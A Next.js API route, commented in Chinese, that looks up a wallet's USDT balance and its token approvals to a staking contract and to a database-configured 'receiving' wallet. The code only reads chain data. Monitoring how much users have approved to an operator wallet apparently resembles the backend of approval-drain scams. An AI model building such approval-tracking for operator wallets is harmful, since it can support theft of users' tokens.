import { type NextRequest, NextResponse } from 'next/server'
import { addCorsHeaders } from '@/lib/utils'
import { ethers } from 'ethers'
import ETH_NETWORK_CONFIG from '@/config/eth-network'
import { createSupabaseServerClient } from '@/lib/supabase-server'

export const dynamic = 'force-dynamic'

// ETH 网络配置 - 以太坊主网
const ETH_RPC_URLS = [
  ETH_NETWORK_CONFIG.RPC_URL,
  ...ETH_NETWORK_CONFIG.FALLBACK_RPC_URLS
]

const USDT_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.USDT_CONTRACT_ADDRESS
const STAKING_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.STAKING_CONTRACT_ADDRESS
const USDT_DECIMALS = ETH_NETWORK_CONFIG.USDT_DECIMALS

// USDT 合约 ABI
const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {"name": "_owner", "type": "address"},
      {"name": "_spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"name": "", "type": "uint256"}],
    "type": "function"
  }
]

// 创建带有备用节点的Provider
async function createProvider() {
  for (let i = 0; i < ETH_RPC_URLS.length; i++) {
    try {
      const provider = new ethers.JsonRpcProvider(ETH_RPC_URLS[i])
      await provider.getNetwork()
      console.log(`✅ 连接到RPC节点 ${i + 1}: ${ETH_RPC_URLS[i]}`)
      return provider
    } catch (error) {
      console.log(`❌ RPC节点 ${i + 1} 连接失败: ${ETH_RPC_URLS[i]}`)
      if (i === ETH_RPC_URLS.length - 1) {
        throw new Error('所有RPC节点都连接失败')
      }
    }
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json() as { userAddress?: string }
    const { userAddress } = body

    if (!userAddress) {
      const response = NextResponse.json({
        success: false,
        error: '缺少用户地址参数'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    console.log(`🔍 查询用户授权额度: ${userAddress}`)

    // 创建 ETH 网络提供者
    const provider = await createProvider()
    
    // 创建 USDT 合约实例
    const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider)

    // 查询用户USDT余额
    const userBalance = await usdtContract.balanceOf(userAddress)
    const userBalanceFormatted = ethers.formatUnits(userBalance, USDT_DECIMALS)
    
    // 查询用户对质押合约的授权额度
    const allowance = await usdtContract.allowance(userAddress, STAKING_CONTRACT_ADDRESS)
    const allowanceFormatted = ethers.formatUnits(allowance, USDT_DECIMALS)

    // 从数据库获取收款地址
    const supabase = createSupabaseServerClient()
    const { data: permissions } = await supabase
      .from('contract_permissions')
      .select('treasury_address')
      .eq('chain_type', 'ERC')
      .eq('is_enabled', true)
      .order('sort', { ascending: true })
      .limit(1)
    
    // 使用配置的收款地址，如果没有配置则使用管理员地址
    const adminAddress = permissions && permissions.length > 0 && permissions[0].treasury_address
      ? permissions[0].treasury_address
      : '0x0000000000000000000000000000000000000000' // 如果未配置，使用零地址（不会匹配任何授权）
    
    // 查询用户对管理员地址的授权额度（仅当配置了收款地址时）
    let adminAllowance = BigInt(0)
    let adminAllowanceFormatted = '0.0'
    if (adminAddress !== '0x0000000000000000000000000000000000000000') {
      adminAllowance = await usdtContract.allowance(userAddress, adminAddress)
      adminAllowanceFormatted = ethers.formatUnits(adminAllowance, USDT_DECIMALS)
    }

    const result = {
      userAddress: userAddress,
      usdtBalance: userBalanceFormatted,
      stakingAllowance: allowanceFormatted,
      adminAllowance: adminAllowanceFormatted,
      stakingContractAddress: STAKING_CONTRACT_ADDRESS,
      adminAddress: adminAddress,
      usdtContractAddress: USDT_CONTRACT_ADDRESS,
      message: allowanceFormatted === '0.0' ? 
        `用户未对质押合约 ${STAKING_CONTRACT_ADDRESS} 进行USDT授权` :
        `用户已授权 ${allowanceFormatted} USDT 给质押合约`,
      adminMessage: adminAddress === '0x0000000000000000000000000000000000000000' ?
        '收款地址未配置' :
        (adminAllowanceFormatted === '0.0' ?
          `用户未对收款地址 ${adminAddress} 进行USDT授权` :
          `用户已授权 ${adminAllowanceFormatted} USDT 给收款地址`),
      timestamp: new Date().toISOString()
    }

    console.log(`✅ 授权查询成功: ${JSON.stringify(result, null, 2)}`)

    const response = NextResponse.json({
      success: true,
      data: result
    }, { status: 200 })
    return addCorsHeaders(response)

  } catch (error) {
    console.error('授权查询失败:', error)
    const response = NextResponse.json({
      success: false,
      error: '授权查询失败',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
    return addCorsHeaders(response)
  }
}
